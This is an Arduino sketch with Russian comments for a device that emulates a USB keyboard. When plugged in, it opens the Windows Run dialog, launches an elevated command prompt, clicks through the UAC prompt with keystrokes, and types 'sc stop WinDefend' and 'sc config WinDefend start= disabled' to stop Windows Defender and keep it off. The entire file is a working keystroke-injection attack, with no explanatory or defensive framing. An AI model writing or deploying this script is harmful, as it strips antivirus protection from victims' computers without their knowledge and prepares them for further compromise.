#include <Keyboard.h>

void setup() {
  // Ожидание инициализации
  delay(5000);

  // Открытие "Выполнить"
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  // Ввод команд для отключения антивируса
  Keyboard.print("cmd");
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(300);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(300);
  Keyboard.releaseAll();
  delay(1000);

  // Отключение антивируса
  Keyboard.print("sc stop WinDefend");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("sc config WinDefend start= disabled");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("exit");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}

void loop() {
  // Пустой цикл
}
